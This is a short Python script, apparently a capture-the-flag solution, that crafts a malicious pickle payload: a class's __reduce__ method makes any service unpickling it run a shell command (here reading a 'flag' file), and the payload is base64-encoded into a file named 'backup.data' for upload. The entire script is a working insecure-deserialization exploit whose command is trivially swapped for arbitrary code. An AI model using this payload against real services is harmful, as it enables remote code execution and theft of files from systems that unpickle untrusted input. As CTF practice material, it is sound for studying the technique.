import pickle
import subprocess
import base64
class Yolo(object):
    def __reduce__(self):
        return (subprocess.check_output,(["cat","flag"],))

data = pickle.dumps(Yolo())

with open('backup.data','wb') as file:
    file.write(base64.b64encode(data))
